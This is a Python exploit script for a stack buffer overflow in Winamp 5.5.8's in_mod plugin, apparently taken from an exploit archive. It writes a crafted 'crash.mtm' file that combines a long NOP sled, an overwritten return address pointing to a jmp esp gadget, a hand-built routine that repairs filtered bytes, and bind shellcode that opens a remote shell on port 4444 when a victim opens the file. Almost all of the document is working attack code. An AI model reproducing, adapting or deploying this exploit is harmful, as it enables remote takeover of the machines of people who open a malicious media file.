#!/usr/bin/python
# Pwn And Beans by Mighty-D presents:
# Winamp 5.5.8.2985 (in_mod plugin) Stack Overflow
# WINDOWS XP SP3 FULLY PATCHED - NO ASLR OR DEP BYPASS... yet
# Bug found by http://www.exploit-db.com/exploits/15248/
# POC by fdisk
# Exploit by Mighty-D
# Special thanks to:
# fdisk: Who wrote the skeleton of what you are looking at
# Ryujin: For pointing the bug
# Muts: For bringing the pain and the omelet ideas that weren't used
# dijital1 and All the EDB-Team
# The guys from UdeA, Ryepes, HerreraDavid, GomezRam7
# Just one comment: Stupid badchars!!!!!!!

header = "\x4D\x54\x4D\x10\x53\x70\x61\x63\x65\x54\x72\x61\x63\x6B\x28\x6B\x6F\x73\x6D\x6F\x73\x69\x73\x29\xE0\x00\x29\x39\x20\xFF\x1F\x00\x40\x0E"
header += "\x04\x0C" * 16

nopsled = "\x90" * 58207

eip = "\xED\x1E\x95\x7C" # jmp esp WIN XP SPANISH change at will

patch_shellcode = "\x90" * 16
patch_shellcode += "\x90\x33\xDB" # Set EBX to zero
patch_shellcode += "\x54\x5B" # PUSH ESP ; POP EBX  GET THE RELATIVE POSITION
patch_shellcode += "\x81\xEB\x95\xFC\xFF\xFF" # make EBX point to our shell
patch_shellcode += "\x43"*13 # Move EBX as close as we can to the first badchar
patch_shellcode += "\x90"*4 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*1 # Move EBX to the first badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 13 -  verified
patch_shellcode += "\x43"*3 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 05  - verified
patch_shellcode += "\x43"*16 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\xEC" # Set it to 21 - verified
patch_shellcode += "\x43"*1 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x7C" # Set it to 8e - verified
patch_shellcode += "\x90"*8 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*30 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 05 - verified
patch_shellcode += "\x90"*8 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*11 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x42" # Set it to CB - verified
patch_shellcode += "\x43"*1 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x78" # Set it to 92 - verified
patch_shellcode += "\x90"*26 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*18 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 04 - verified
patch_shellcode += "\x90"*16 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*15 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 02 - verified
patch_shellcode += "\x43"*8 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x21" # Set it to EC - verified
patch_shellcode += "\x43"*1 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x7C" # Set it to 8e - verified
patch_shellcode += "\x90"*14 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*18 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x49" # Set it to c1 - verified
patch_shellcode += "\x90"*13 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*4 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to EA, but we need F6
patch_shellcode += "\x80\x2B\xF4" # Set it to F6 - verified
patch_shellcode += "\x43"*9 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 11 - verified
patch_shellcode += "\x43"*10 # Move EBX to the next badchar
patch_shellcode += "\x90"*3 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x80\x2B\xCD" # Set it to 3D - verified
patch_shellcode += "\x43"*3 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 07 - verified
patch_shellcode += "\x43"*11 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 12 - verified
patch_shellcode += "\x43"*4 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 12 - verified
patch_shellcode += "\x90"*13 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*4 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 12 - verified
patch_shellcode += "\x43"*8 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 12 - verified
patch_shellcode += "\x90"*19 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*11 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x8E" # Set it to 7F - verified
patch_shellcode += "\x43"*1 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\xDF" # Set it to 2B - verified
patch_shellcode += "\x43"*8 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x1E" # Set it to EC - verified
patch_shellcode += "\x90"*11 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*12 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 8 - verified
patch_shellcode += "\x90"*28 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*29 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\xa7" # Set it to 66 - verified
patch_shellcode += "\x43"*1 # Move EBX to the next badchar
patch_shellcode += "\x90"*4 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x80\x2B\xb8" # Set it to 52 - verified
patch_shellcode += "\x90"*9 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*17 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 3 - verified
patch_shellcode += "\x90"*9 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*3 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 12 - verified
patch_shellcode += "\x90"*12 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*2 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 3 - verified
patch_shellcode += "\x43"*7 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 2 - verified
patch_shellcode += "\x90"*10 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*6 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 13 - verified
patch_shellcode += "\x43"*3 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to  5 - verified
patch_shellcode += "\x43"*3 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x1B" # Set it to F2 - verified
patch_shellcode += "\x43"*1 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\xF4" # Set it to 16 - verified
patch_shellcode += "\x90"*19 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*4 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 10 - verified
patch_shellcode += "\x43"*4 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 10 - verified
patch_shellcode += "\x90"*20 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*17 # Move EBX to the next badchar
patch_shellcode += "\x90"*28 # Lazy nopsled
patch_shellcode += "\x43"*16 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x26" # Set it to E7 - verified
patch_shellcode += "\x90"*18 # Nop sled to avoid damage from CrLf
patch_shellcode += "\x43"*1 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\xBE" # Set it to 4C - verified
patch_shellcode += "\x43"*7 # Move EBX to the next badchar
patch_shellcode += "\x80\x2B\x20" # Set it to 5 - verified
patch_shellcode += "\x90"*(66)

# win32_bind -  EXITFUNC=process LPORT=4444 Size=344 Encoder=PexFnstenvSub
shellcode  = "\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
shellcode += "\x33" # Should be 13
shellcode += "\xa9\x41"
shellcode += "\x25" # should be 05
shellcode += "\x3f\x83\xeb\xfc\xe2\xf4\x55\x2b\xee\x72\x41\xb8\xfa\xc0"
shellcode += "\x56" # \x21\x8e Ripped
shellcode += "\x53\x8d\x65\x8e\x7a\x95\xca\x79\x3a\xd1\x40\xea\xb4"
shellcode += "\xe6\x59\x8e\x60\x89\x40\xee\x76\x22\x75\x8e\x3e\x47\x70\xc5\xa6"
shellcode += "\x25" # should be 05
shellcode += "\xc5\xc5\x4b\xae\x80\xcf\x32\xa8\x83\xee" # \xcb\x92
shellcode += "\x15\x21\x17"
shellcode += "\xdc\xa4\x8e\x60\x8d\x40\xee\x59\x22\x4d\x4e\xb4\xf6\x5d"
shellcode += "\x24" #Should be 04
shellcode += "\xd4\xaa\x6d\x8e\xb6\xc5\x65\x19\x5e\x6a\x70\xde\x5b\x22"
shellcode += "\x22" # Should be 02
shellcode += "\x35\xb4\xe9\x4d\x8e\x4f\xb5" # \xec\8e Ripped
shellcode += "\x7f\xa1\x1f\x6d\xb1\xe7\x4f\xe9\x6f"
shellcode += "\x56\x97\x63\x6c\xcf\x29\x36\x0d" # \xc1 Ripped
shellcode += "\x36\x76\x0d" # \xf6 ripped
shellcode += "\x15\xfa\xef"
shellcode += "\xc1\x8a\xe8\xc3\x92"
shellcode += "\x31" # Should be 11
shellcode += "\xfa\xe9\xf6\xc8\xe0\x59\x28\xac\x0d" # \x3d ripped
shellcode += "\xfc\x2b"
shellcode += "\x27" # should be 07
shellcode += "\xc0\x79\x29\xdc\x36\x5c\xec\x52\xc0\x7f"
shellcode += "\x32" # should be 12
shellcode += "\x56\x6c\xfa"
shellcode += "\x32" # should be 12
shellcode += "\x46\x6c\xea"
shellcode += "\x32" # should be 12
shellcode += "\xfa\xef\xcf\x29\x14\x63\xcf"
shellcode += "\x32" #should be 12
shellcode += "\x8c\xde"
shellcode += "\x3c\x29\xa1\x25\xd9\x86\x52\xC0" # \x7f\x2b Ripped
shellcode += "\x15\x6e\xfc\xbe\xd5\x57"
shellcode += "\x0d" # \xec Ripped
shellcode += "\x2b\xd6\xfe\xbe\xd3\x6c\xfc\xbe\xd5\x57\x4c"
shellcode += "\x28" # should be 08
shellcode += "\x83\x76"
shellcode += "\xfe\xbe\xd3\x6f\xfd\x15\x50\xc0\x79\xd2\x6d\xd8\xd0\x87\x7c\x68"
shellcode += "\x56\x97\x50\xc0\x79\x27\x6f\x5b\xcf\x29" # \x66\x52 Ripped
shellcode += "\x20\xa4\x6f\x6f"
shellcode += "\xf0\x68\xc9\xb6\x4e\x2b\x41\xb6\x4b\x70\xc5\xcc"
shellcode += "\x23" # shoudl be 03
shellcode += "\xbf\x47"
shellcode += "\x32" #Should be 12
shellcode += "\x57"
shellcode += "\x23" # Should be 03
shellcode += "\x29\xac\x24\x3b\x3d\x94"
shellcode += "\x22"  # should be 02
shellcode += "\xea\x6d\x4d\x57\xf2"
shellcode += "\x33" # should be 13
shellcode += "\xc0\xdc"
shellcode += "\x25" # should be 5
shellcode += "\xfa\xe9" # \xf2\x16 Ripped
shellcode += "\x57\x6e\xf8"
shellcode += "\x30" #should be 10
shellcode += "\x6f\x3e\xf8"
shellcode += "\x30" # Should be 10
shellcode += "\x50\x6e"
shellcode += "\x56\x91\x6d\x92\x70\x44\xcb\x6c\x56\x97\x6f\xc0\x56\x76\xfa\xef"
shellcode += "\x22\x16\xf9\xbc\x6d\x25\xfa\xe9\xfb\xbe\xd5"
shellcode += "\x57\xd7\x99" #\xe7\x4c Ripped
shellcode += "\xfa\xbe\xd3\xc0\x79\x41"
shellcode += "\x25" # should be 05
shellcode += "\x3f"

payload = header + nopsled + eip + patch_shellcode + shellcode

try:
file = open("crash.mtm", "w")
file.write(payload)
file.close()
print "MTM file generated successfuly"
except:
print "Cannot create file"